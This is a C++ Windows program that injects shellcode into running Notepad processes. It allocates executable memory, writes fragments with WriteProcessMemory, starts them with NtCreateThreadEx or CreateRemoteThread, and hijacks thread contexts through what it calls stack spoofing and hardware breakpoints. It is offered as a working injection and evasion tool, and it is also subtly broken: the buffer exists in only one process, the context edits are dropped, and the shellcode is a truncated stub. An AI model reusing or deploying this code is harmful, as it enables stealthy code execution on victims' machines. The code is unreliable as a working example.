#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <winternl.h>

// NT API definition for thread creation
typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN SIZE_T ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PVOID AttributeList OPTIONAL
);

// Test Shellcode (MessageBox)
unsigned char shellcode[] =
    "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41";

size_t shellcodeSize = sizeof(shellcode) - 1;
int numParts = 3;  // Number of processes to split into

std::vector<DWORD> processList;

// 🔍 **Find Target Processes**
DWORD FindProcessID(const wchar_t* processName) {
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD processID = 0;

    if (Process32First(snapshot, &processEntry)) {
        do {
            if (_wcsicmp(processEntry.szExeFile, processName) == 0) {
                processID = processEntry.th32ProcessID;
                processList.push_back(processID);
            }
        } while (Process32Next(snapshot, &processEntry));
    }
    CloseHandle(snapshot);
    return processID;
}

// 🛠 **Function for Injection and Shellcode Reconstruction**
bool InjectAndRebuildShellcode(DWORD pid, unsigned char* fragment, size_t fragmentSize, LPVOID& remoteBuffer) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cout << "[-] Failed to open process " << pid << std::endl;
        return false;
    }

    // 🔹 **Create a Single Buffer for Reconstruction**
    if (!remoteBuffer) {
        remoteBuffer = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remoteBuffer) {
            std::cout << "[-] Failed to allocate buffer in process " << pid << "\n";
            CloseHandle(hProcess);
            return false;
        }
    }

    // 🔹 **Write Fragment into Buffer**
    SIZE_T offset = fragment - shellcode; // Calculate the correct position
    if (!WriteProcessMemory(hProcess, (LPVOID)((uintptr_t)remoteBuffer + offset), fragment, fragmentSize, NULL)) {
        std::cout << "[-] Failed to write fragment into process " << pid << "\n";
        CloseHandle(hProcess);
        return false;
    }

    std::cout << "[+] Fragment injected into PID " << pid << " at position: " << offset << std::endl;

    CloseHandle(hProcess);
    return true;
}

// 🚀 **Execute Shellcode After Reconstruction**
void ExecuteShellcode(DWORD pid, LPVOID remoteAddress) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cout << "[-] Failed to open process " << pid << " for execution.\n";
        return;
    }

    HANDLE hThread;
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtCreateThreadEx");

    if (NtCreateThreadEx) {
        NTSTATUS status = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, remoteAddress, NULL, FALSE, 0, 0, 0, NULL);
        if (status == 0) {
            std::cout << "[+] Shellcode executed in PID: " << pid << std::endl;
            CloseHandle(hThread);
        } else {
            std::cout << "[-] Failed to execute shellcode. NTSTATUS: " << std::hex << status << std::endl;
        }
    } else {
        std::cout << "[!] NtCreateThreadEx not found. Trying CreateRemoteThread...\n";
        hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteAddress, NULL, 0, NULL);
        if (hThread) {
            std::cout << "[+] Shellcode executed in PID: " << pid << std::endl;
            CloseHandle(hThread);
        } else {
            std::cout << "[-] Failed to start shellcode via CreateRemoteThread.\n";
        }
    }

    CloseHandle(hProcess);
}

// 🔥 **Applying Stack Spoofing and Hardware Breakpoint**
void ApplyStackSpoofingAndBreakpoint(DWORD pid, LPVOID remoteAddress) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cout << "[-] Failed to open process for Stack Spoofing.\n";
        return;
    }

    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;

    if (Thread32First(hThreadSnap, &te32)) {
        do {
            if (te32.th32OwnerProcessID == pid) {
                HANDLE hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, te32.th32ThreadID);
                if (hThread) {
                    GetThreadContext(hThread, &ctx);

                    // Stack Spoofing: Trick Stack Pointer
                    ctx.Rsp -= sizeof(LPVOID);
                    WriteProcessMemory(hProcess, (LPVOID)ctx.Rsp, &remoteAddress, sizeof(LPVOID), NULL);
                    ctx.Rip = (DWORD64)remoteAddress;

                    // Hardware Breakpoint
                    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
                    ctx.Dr0 = (DWORD_PTR)remoteAddress;
                    ctx.Dr7 = 1;

                    SetThreadContext(hThread, &ctx);
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hThreadSnap, &te32));
    }
    CloseHandle(hThreadSnap);
    CloseHandle(hProcess);
}

int main() {
    FindProcessID(L"notepad.exe");

    if (processList.size() < numParts) {
        std::cout << "[-] Not enough target processes. Open more instances of Notepad!\n";
        return -1;
    }

    size_t partSize = shellcodeSize / numParts;
    LPVOID remoteBuffer = NULL;

    std::cout << "[*] Injecting shellcode fragments...\n";
    for (int i = 0; i < numParts; i++) {
        DWORD targetPID = processList[i];

        if (!InjectAndRebuildShellcode(targetPID, shellcode + (i * partSize), partSize, remoteBuffer)) {
            std::cout << "[-] Injection failed in process " << targetPID << "\n";
            return -1;
        }
    }

    std::cout << "[*] Applying Stack Spoofing and Hardware Breakpoint on PID: " << processList[0] << "\n";
    ApplyStackSpoofingAndBreakpoint(processList[0], remoteBuffer);

    std::cout << "[*] Executing reconstructed shellcode in PID: " << processList[0] << "\n";
    ExecuteShellcode(processList[0], remoteBuffer);

    return 0;
}
